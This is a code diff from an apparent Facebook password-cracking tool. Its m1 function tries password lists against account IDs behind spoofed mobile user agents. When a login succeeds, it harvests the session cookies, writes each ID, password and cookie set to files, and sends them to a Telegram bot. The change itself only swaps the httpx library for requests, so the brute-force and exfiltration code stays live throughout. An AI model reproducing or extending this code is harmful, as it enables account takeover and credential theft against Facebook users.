@@ -698,7 +698,7 @@ def m1(ids,pwv):
     ua3 ="Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm2))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
     try:
         for pas in pwv:
-            session = httpx.Client()
+            session = requests.Session()
             free_fb = session.get('https://free.facebook.com').text
             info={
             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -741,13 +741,13 @@ def m1(ids,pwv):
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                 cid = re.findall('c_user=(.*);xs',kuki)[0]
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
-                res = httpx.get(ckk).text
+                res = requests.get(ckk).text
                 if 'Photoshop' in res:
                         print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                         print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                         cek_apk(kuki)
                         statusok = (f" {cid} | {pas} | {kuki} ")
-                        httpx.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                         open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')                        
                         oks.append(cid)
                         break
@@ -762,7 +762,7 @@ def m1(ids,pwv):
                 continue
             time.sleep(0.01)
         loop+=1
-    except httpx.HTTPError:
+    except requests.exceptions.ConnectionError:
         time.sleep(30)
     except Exception as e:
         pass
